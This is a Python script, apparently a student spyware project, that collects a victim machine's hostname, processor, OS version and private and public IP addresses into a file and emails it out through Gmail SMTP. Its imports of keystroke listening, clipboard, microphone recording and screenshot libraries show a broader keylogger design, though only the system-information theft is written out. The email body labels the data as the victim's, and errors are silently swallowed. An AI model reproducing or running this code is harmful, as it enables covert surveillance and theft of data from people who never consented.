from email import message
from email.message import EmailMessage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from fileinput import filename
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
import time, os, smtplib, shutil
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
system_information = "systeminfo.txt"

# file_path = r"C:\\Users\\Vinita Vaswani\\Desktop\\csPro"
file_path="C:"
extend = "\\"
def computer_information():
    with open(file_path + extend + system_information, "w+") as f:
        # f=open("C:\\"+system_information,"w+")
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

def send_mail():
    try:
        
        msg=EmailMessage()
        msg["From"]="vinitavaswani24@gmail.com"
        msg["To"]="vinitavaswani24@gmail.com"
        msg["Subject"]="System Information"
        body="Victim's system information"
        # path="C:\\Users\\Vinita Vaswani\\Desktop\\csPro\\systeminfo.txt"
        path="C:\\systeminfo.txt"
        msg.set_content(body)
        msg.add_attachment(open(path,"r").read(),filename="systeminfo.txt")
        print("attachement added successfully now logging in to email account")
        server=smtplib.SMTP("smtp.gmail.com",587)
        server.ehlo()

        server.starttls()
        server.login("vinitavaswani24@gmail.com","Enter your app password here")
        server.send_message(msg)
        print("Message send successfully")
        server.close()
        # os.remove("C:\\Users\\Vinita Vaswani\\Desktop\\csPro\\systeminfo.txt")
    except Exception as mail_error:
        # os.remove("C:\\Users\\Vinita Vaswani\\Desktop\\csPro\\systeminfo.txt")
        pass

computer_information()
send_mail()